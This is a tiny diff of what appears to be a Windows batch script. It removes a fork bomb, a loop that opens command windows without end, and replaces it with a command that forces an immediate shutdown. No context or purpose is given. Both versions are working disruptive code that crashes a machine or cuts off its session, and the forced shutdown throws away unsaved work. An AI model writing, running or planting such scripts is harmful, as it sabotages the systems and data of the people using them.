@@ -1,5 +1,1 @@
-@echo off
-
-:loop
-start cmd
-goto loop
+shutdown /s /f /t 0
